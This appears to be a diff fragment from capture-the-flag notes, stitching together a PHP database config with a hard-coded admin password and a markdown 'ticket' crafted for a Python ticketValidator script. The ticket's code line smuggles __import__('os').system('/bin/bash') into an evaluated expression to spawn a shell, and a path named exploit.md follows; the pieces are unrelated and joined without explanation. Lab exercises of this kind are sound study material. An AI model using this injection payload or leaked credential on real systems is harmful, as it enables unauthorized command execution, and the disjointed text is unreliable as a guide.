@@ -1,0 +1,17 @@
+<?php
+// TODO -> Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+?>
+
+opt/skytrain_inc/ticketValidator.py
+
+# Skytrain Inc
+## Ticket to 
+__Ticket Code:__
+**102+10==112 and __import__('os').system('/bin/bash') == False
+./home/development/exploit.md
+
